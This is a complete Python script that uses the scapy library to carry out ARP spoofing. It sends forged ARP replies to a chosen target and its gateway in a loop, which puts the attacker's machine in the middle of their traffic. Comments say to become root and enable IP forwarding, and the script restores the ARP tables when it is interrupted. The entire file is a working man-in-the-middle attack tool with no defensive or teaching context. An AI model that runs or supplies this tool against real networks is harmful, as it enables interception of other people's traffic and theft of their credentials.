#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse

def get_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', dest='target', help='Target IP')
	parser.add_argument('-g', '--gateway', dest='gateway', help='Gateway IP')
	(options) = parser.parse_args()
	return options

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast,timeout=1, verbose=False)[0]
	
	return answered_list[0][1].hwsrc
	

def spoof(target_ip,spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
	scapy.send(packet, verbose=False)

def restore(dest_ip,src_ip):
	dest_mac = get_mac(dest_ip)
	src_mac = get_mac(src_ip)
	packet = scapy.ARP(op=2, pdst=dest_ip,hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
	scapy.send(packet, count=4, verbose=False)
#run sudo su
#run echo 1 > /proc/sys/net/ipv4/ip_forward
options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

try:
	sent_packets_count = 0
	while True:
		spoof(target_ip,gateway_ip)
		spoof(gateway_ip,target_ip)
		sent_packets_count = sent_packets_count + 2
		print('[+] Packets sent: ' + str(sent_packets_count), end="\r")
		time.sleep(2)
except KeyboardInterrupt:
	print('[-] Detected CTRL + C ........ Resetting ARP tables please wait')
	restore(target_ip,gateway_ip)
	restore(gateway_ip,target_ip)